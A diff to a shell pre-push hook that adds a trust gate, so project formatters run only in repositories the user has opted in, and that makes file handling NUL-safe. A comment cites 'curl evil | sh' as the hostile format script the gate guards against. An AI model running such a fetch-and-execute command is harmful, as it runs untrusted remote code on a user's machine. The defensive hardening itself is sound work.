@@ -63,6 +63,27 @@ if [ -z "$changed_files" ]; then
   exit 0
 fi
 
+# Trust gate (#145): a repo's format script, a node_modules formatter, or an
+# npx-downloaded one all execute repo-controlled (or freshly downloaded)
+# code. A hostile clone with "format": "curl evil | sh" would otherwise run
+# on the first push. Only proceed in repos the user explicitly listed.
+repo_root=$(git rev-parse --show-toplevel 2>/dev/null || echo "")
+if [ -z "$repo_root" ]; then
+  exit 0
+fi
+TRUST_FILE="${HOME}/.oss-scout/format-trusted-repos"
+if [ ! -f "$TRUST_FILE" ] || ! grep -Fxq "$repo_root" "$TRUST_FILE" 2>/dev/null; then
+  # Only nudge about opting in when a formatter could plausibly run here.
+  # Pure file-existence checks: no repo-controlled code executes pre-trust.
+  if [ -f "package.json" ] || [ -f ".prettierrc" ] || [ -f ".prettierrc.json" ] \
+    || [ -f "prettier.config.js" ] || [ -f "prettier.config.mjs" ] \
+    || [ -f ".prettierrc.yaml" ] || [ -f "biome.json" ] || [ -f "biome.jsonc" ] \
+    || [ -f "pyproject.toml" ]; then
+    warn_and_exit "Skipped auto-format: this repo is not opted in. To enable, add this line to ${TRUST_FILE}: ${repo_root}"
+  fi
+  exit 0
+fi
+
 # Detect and run project formatter
 format_result=""
 format_error=""
@@ -91,16 +112,16 @@ fi
 # Fallback: check for standalone formatter config files
 if [ -z "$format_result" ] && [ -z "$format_error" ]; then
   if [ -f ".prettierrc" ] || [ -f ".prettierrc.json" ] || [ -f "prettier.config.js" ] || [ -f "prettier.config.mjs" ] || [ -f ".prettierrc.yaml" ]; then
-    format_error=$(printf '%s\n' "$changed_files" | xargs -I {} npx prettier --write {} 2>&1 >/dev/null) && format_result="prettier" || true
+    format_error=$(printf '%s\n' "$changed_files" | tr '\n' '\0' | xargs -0 npx prettier --write 2>&1 >/dev/null) && format_result="prettier" || true
   elif [ -f "biome.json" ] || [ -f "biome.jsonc" ]; then
-    format_error=$(printf '%s\n' "$changed_files" | xargs -I {} npx @biomejs/biome format --write {} 2>&1 >/dev/null) && format_result="biome" || true
+    format_error=$(printf '%s\n' "$changed_files" | tr '\n' '\0' | xargs -0 npx @biomejs/biome format --write 2>&1 >/dev/null) && format_result="biome" || true
   elif [ -f "pyproject.toml" ] && grep -qE '\[tool\.(black|ruff)\]' pyproject.toml 2>/dev/null; then
     py_files=$(printf '%s\n' "$changed_files" | grep '\.py$' || true)
     if [ -n "$py_files" ]; then
       if command -v ruff &>/dev/null; then
-        format_error=$(printf '%s\n' "$py_files" | xargs -I {} ruff format {} 2>&1 >/dev/null) && format_result="ruff format" || true
+        format_error=$(printf '%s\n' "$py_files" | tr '\n' '\0' | xargs -0 ruff format 2>&1 >/dev/null) && format_result="ruff format" || true
       elif command -v black &>/dev/null; then
-        format_error=$(printf '%s\n' "$py_files" | xargs -I {} black {} 2>&1 >/dev/null) && format_result="black" || true
+        format_error=$(printf '%s\n' "$py_files" | tr '\n' '\0' | xargs -0 black 2>&1 >/dev/null) && format_result="black" || true
       fi
     fi
   fi
@@ -120,13 +141,26 @@ if git diff --quiet 2>/dev/null; then
   exit 0
 fi
 
-# Stage ONLY files that the formatter actually modified
+# Stage only files that are BOTH formatter-modified AND part of the branch
+# diff. A repo-wide format script can sweep unrelated pre-existing drift
+# into the commit (#145); restore those files instead. Filenames containing
+# newlines remain unsupported (NUL-safe add/restore below covers spaces,
+# quotes, and backslashes).
 formatted_files=$(git diff --name-only 2>/dev/null || echo "")
 if [ -z "$formatted_files" ]; then
   exit 0
 fi
+to_stage=$(comm -12 <(printf '%s\n' "$changed_files" | sort) <(printf '%s\n' "$formatted_files" | sort))
+to_restore=$(comm -13 <(printf '%s\n' "$changed_files" | sort) <(printf '%s\n' "$formatted_files" | sort))
 
-if ! printf '%s\n' "$formatted_files" | xargs -I {} git add {} >/dev/null 2>&1; then
+if [ -n "$to_restore" ]; then
+  printf '%s\n' "$to_restore" | tr '\n' '\0' | xargs -0 git checkout -- >/dev/null 2>&1 || true
+fi
+if [ -z "$to_stage" ]; then
+  exit 0
+fi
+
+if ! printf '%s\n' "$to_stage" | tr '\n' '\0' | xargs -0 git add -- >/dev/null 2>&1; then
   warn_and_exit "Failed to stage formatting changes (git add failed). Push continuing without formatting commit."
 fi
 
